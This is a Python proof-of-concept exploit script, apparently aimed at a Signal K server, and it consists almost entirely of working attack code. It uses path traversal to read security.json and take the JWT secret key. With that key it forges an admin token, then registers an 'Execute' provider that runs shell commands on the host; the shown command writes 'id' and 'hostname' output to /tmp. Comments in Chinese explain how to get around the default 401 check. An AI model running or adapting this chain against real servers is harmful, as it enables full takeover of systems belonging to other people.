#!/usr/bin/env python3
import base64, hashlib, hmac, json, os, time, urllib.request, sys

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:13000"
CMD = "id > /tmp/sk-pwned; hostname >> /tmp/sk-pwned"

def get(path, tok=None):
    r = urllib.request.Request(BASE + path)
    if tok:
        r.add_header("Authorization", "JWT " + tok)
    return urllib.request.urlopen(r, timeout=10)

def post(path, body, tok=None):
    r = urllib.request.Request(BASE + path, data=json.dumps(body).encode(), method="POST")
    r.add_header("Content-Type", "application/json")
    if tok:
        r.add_header("Authorization", "JWT " + tok)
    return urllib.request.urlopen(r, timeout=10)

b64 = lambda b: base64.urlsafe_b64encode(b).rstrip(b"=").decode()

# 默认配置下 allow_readonly=false，匿名打 traversal 会被 401 挡住。
# 给一组只读账号即可（SK_USER/SK_PASS），或者直接给 SK_TOKEN。
TOK0 = os.environ.get("SK_TOKEN")
if not TOK0 and os.environ.get("SK_USER"):
    TOK0 = json.load(post("/login", {"username": os.environ["SK_USER"],
                                     "password": os.environ["SK_PASS"]}))["token"]
    print("[0] readonly login ok, token", TOK0[:24] + "...")

print("[1] traversal read security.json")
sec = json.load(get("/signalk/v2/api/resources/notes/..%2F..%2F..%2F..%2Fsecurity.json", TOK0))
sk = sec["secretKey"]
print("    allow_readonly =", sec.get("allow_readonly"), "| secretKey len =", len(sk))

print("[2] forge admin JWT")
h = b64(json.dumps({"alg": "HS256", "typ": "JWT"}).encode())
c = b64(json.dumps({"id": "admin", "iat": int(time.time())}).encode())
tok = h + "." + c + "." + b64(hmac.new(sk.encode(), (h + "." + c).encode(), hashlib.sha256).digest())
print("    token:", tok[:40] + "...")
print("    loginStatus:", json.load(get("/skServer/loginStatus", tok)))

print("[3] create Execute provider")
prov = {"id": "poc-rce", "enabled": True, "logging": False, "type": "Execute",
        "options": {"type": "ws", "dataType": "SignalK", "command": CMD}}
print("    resp:", post("/skServer/providers", prov, tok).read().decode()[:120])
